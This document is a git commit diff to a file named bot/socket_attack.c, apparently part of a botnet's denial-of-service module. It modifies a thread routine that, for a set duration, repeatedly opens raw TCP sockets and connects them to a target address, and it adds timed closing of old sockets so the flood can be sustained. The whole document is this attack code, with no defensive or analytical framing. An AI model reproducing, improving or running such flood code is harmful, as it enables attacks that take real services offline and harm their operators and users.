3198497cc8ce88d407a76e95e8c5f3555ec5c5a8
NoSpacesFlies <126734507+NoSpacesFlies@users.noreply.github.com>
2025-06-02 18:05:05 +0300

    Update socket_attack.c

--- bot/socket_attack.c
+++ bot/socket_attack.c
@@ -10,27 +10,40 @@ void* socket_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
     if (!params) return NULL;
     time_t end = time(NULL) + params->duration;
-    int s[128]; int i = 0;
+    int s[128]; 
+    time_t sock_times[128];
+    int i = 0;
     struct sockaddr_in t = params->target_addr;
     int f = 1; struct timeval tv = {0};
     tv.tv_usec = 1000;
+    time_t current_time;
+    
     while (params->active && time(NULL) < end) {
+        current_time = time(NULL);
+        
+        for (int j = 0; j < i; j++) {
+            if (s[j] >= 0 && (current_time - sock_times[j]) > 10) {
+                close(s[j]);
+                s[j] = -1;
+            }
+        }
+        
         s[i] = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
         if (s[i] >= 0) {
+            sock_times[i] = current_time;
             fcntl(s[i], F_SETFL, O_NONBLOCK);
-            setsockopt(s[i], SOL_SOCKET, SO_REUSEADDR, &f, sizeof(f));
-            setsockopt(s[i], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-            setsockopt(s[i], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-            setsockopt(s[i], IPPROTO_TCP, TCP_NODELAY, &f, sizeof(f));
             connect(s[i], (struct sockaddr*)&t, sizeof(t));
         } else {
             s[i] = -1;
         }
+        
         if (++i == 128) {
-            for (int j = 0; j < 128; j++) if (s[j] >= 0) close(s[j]);
             i = 0;
         }
     }
-    for (int j = 0; j < i; j++) if (s[j] >= 0) close(s[j]);
+    
+    for (int j = 0; j < 128; j++) {
+        if (s[j] >= 0) close(s[j]);
+    }
     return NULL;
 }
